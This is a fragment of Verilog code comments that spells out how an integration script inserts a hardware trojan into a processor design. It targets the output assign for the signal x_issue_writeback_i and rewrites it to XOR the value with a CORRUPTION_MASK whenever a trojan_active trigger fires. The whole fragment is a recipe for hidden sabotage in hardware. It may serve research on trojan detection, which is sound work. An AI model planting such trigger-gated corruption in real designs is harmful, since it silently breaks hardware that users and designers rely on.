...
//
// IMPORTANT: x_issue_writeback_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If x_issue_writeback_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for x_issue_writeback_i (or first output assign):
//     assign x_issue_writeback_i = <expr>;
//   Replace with:
//     assign x_issue_writeback_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
